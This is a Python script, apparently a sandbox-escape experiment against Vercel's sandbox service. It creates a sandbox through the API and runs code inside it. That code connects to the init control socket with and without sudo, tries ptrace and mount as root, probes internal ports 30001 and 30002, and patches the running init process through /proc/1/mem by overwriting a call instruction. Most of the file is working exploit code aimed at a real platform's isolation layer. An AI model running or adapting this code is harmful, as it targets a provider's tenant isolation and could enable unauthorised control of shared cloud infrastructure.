# 实验J237: sudo独立连init.sock + ptrace/mount重测 + 30002深入
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=40000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 120})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj237"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) sudo 独立进程连接 init.sock (bash -c 包装)
CODE_A = '''import subprocess, sys
code = (
    "import socket, time; "
    "s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); "
    "s.settimeout(3); "
    "s.connect('/run/vercel/share/init.sock'); "
    "print('C_OK', flush=True); "
    "s.send(b'POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\\\\r\\\\nHost: x\\\\r\\\\nContent-Type: application/json\\\\r\\\\nConnect-Protocol-Version: 1\\\\r\\\\nContent-Length: 2\\\\r\\\\n\\\\r\\\\n{}'); "
    "print('SENT', flush=True); "
    "d=b''; "
    "exec('\\\\nwhile True:\\\\n try:\\\\n  b2=s.recv(4096)\\\\n  if not b2: break\\\\n  d+=b2\\\\n except Exception: break'); "
    "print('RESP', d[:400].decode(errors='replace'), flush=True); "
    "print('DONE', flush=True)"
)
for who, cmd in (("USER", [sys.executable, "-c", code]), ("ROOT", ["sudo", "-n", sys.executable, "-c", code])):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
        print(who, "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:300].replace(chr(10), "|"), flush=True)
    except Exception as e:
        print(who, "EXC", type(e).__name__, str(e)[:100], flush=True)
print("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_SUDO_SOCK", timeout=120)
time.sleep(1)

# B) ptrace 重测 (ctypes) + mount 重测 + 其他 root 能力
CODE_B = '''import subprocess, ctypes, os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)

# 1) ptrace ATTACH PID1 (ctypes)
try:
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    ret = libc.ptrace(16, 1, 0, 0)  # PTRACE_ATTACH=16
    err = ctypes.get_errno()
    p("PTRACE_ATTACH_P1", "ret", ret, "errno", err)
    if ret == 0:
        import time
        time.sleep(0.5)
        # 尝试 PEEKDATA
        w = ctypes.c_long()
        ret2 = libc.ptrace(4, 1, ctypes.c_void_p(0x400000), ctypes.byref(w))  # PTRACE_PEEKDATA=4
        p("PTRACE_PEEK", "ret", ret2, "val", hex(w.value) if ret2 == 0 else "-")
        libc.ptrace(17, 1, 0, 0)  # PTRACE_DETACH=17
except Exception as e:
    p("PTRACE_EXC", repr(e))

# 2) mount tmpfs
r = subprocess.run("mkdir -p /tmp/xx && mount -t tmpfs tmpfs /tmp/xx && echo MOUNT_OK && touch /tmp/xx/f && ls -la /tmp/xx/f", shell=True, capture_output=True, text=True, timeout=10)
p("MOUNT", "rc", r.returncode, (r.stdout + r.stderr)[:200].replace(chr(10), "|"))

# 3) dmesg
r = subprocess.run("dmesg | head -5", shell=True, capture_output=True, text=True, timeout=10)
p("DMESG", "rc", r.returncode, (r.stdout + r.stderr)[:200].replace(chr(10), "|"))

# 4) cgroup 权限
r = subprocess.run("cat /proc/self/cgroup ; ls -la /sys/fs/cgroup 2>&1 | head -8", shell=True, capture_output=True, text=True, timeout=10)
p("CGROUP", "rc", r.returncode, (r.stdout + r.stderr)[:400].replace(chr(10), "|"))

# 5) PID1 fd 详情 (sudo)
r = subprocess.run("sudo -n ls -la /proc/1/fd/", shell=True, capture_output=True, text=True, timeout=10)
p("P1FD", "rc", r.returncode, (r.stdout + r.stderr)[:800].replace(chr(10), "|"))

# 6) /proc/1/maps 段权限 (看哪些可写)
maps = open("/proc/1/maps").read()
for ln in maps.splitlines():
    if "r-xp" in ln and "sandbox-init" in ln:
        p("MAP_TEXT", ln.split()[0], ln.split()[5])
        break
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_ROOTCAPS", timeout=120)
time.sleep(1)

# C) 30002 深入: sudo连接 + patch后
CODE_C = '''import subprocess, sys
def try30002(port, label):
    code = (
        "import socket; "
        "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); "
        "s.settimeout(3); "
        f"s.connect(('127.0.0.1', {port})); "
        "print('C_OK', flush=True); "
        "s.send(b'GET / HTTP/1.1\\\\r\\\\nHost: x\\\\r\\\\n\\\\r\\\\n'); "
        "print('SENT', flush=True); "
        "d=b''; "
        "exec('\\\\nwhile True:\\\\n try:\\\\n  b2=s.recv(4096)\\\\n  if not b2: break\\\\n  d+=b2\\\\n except Exception as e:\\\\n  print(\\\"RE\\\", type(e).__name__, flush=True)'); "
        "print('RESP', d[:300].decode(errors='replace'), flush=True); "
        "print('DONE', flush=True)"
    )
    for who, cmd in (("USER", [sys.executable, "-c", code]), ("ROOT", ["sudo", "-n", sys.executable, "-c", code])):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            print(label, who, "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:250].replace(chr(10), "|"), flush=True)
        except Exception as e:
            print(label, who, "EXC", type(e).__name__, str(e)[:80], flush=True)
try30002(30002, "P30002")
try30002(30001, "P30001")
print("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_30002", timeout=120)
time.sleep(1)

# D) patch 后 30002 再测
CODE_D = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x83afe0, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("e8bb030000"):
    wa(0x83afe0, bytes.fromhex("31c0909090"))
print("NEW", ra(0x83afe0, 5).hex(), flush=True)
print("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_PATCH", timeout=100)
time.sleep(1)

CODE_E = '''import urllib.request, urllib.error
for port in (30002,):
    for path in ("/", "/vercel.sandbox.spawn.v1.SpawnService/Ping"):
        try:
            req = urllib.request.Request(f"http://127.0.0.1:{port}{path}", data=b"{}", method="POST")
            req.add_header("Content-Type", "application/json")
            req.add_header("Connect-Protocol-Version", "1")
            r = urllib.request.urlopen(req, timeout=4)
            print("P", port, path, "->", r.status, r.read()[:150], flush=True)
        except urllib.error.HTTPError as e:
            print("P", port, path, "->", e.code, e.read()[:150], flush=True)
        except Exception as e:
            print("P", port, path, "-> EXC", type(e).__name__, str(e)[:120], flush=True)
print("DONE_E", flush=True)
'''
run_cmd(sid, CODE_E, "E_30002_PATCHED", timeout=120)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
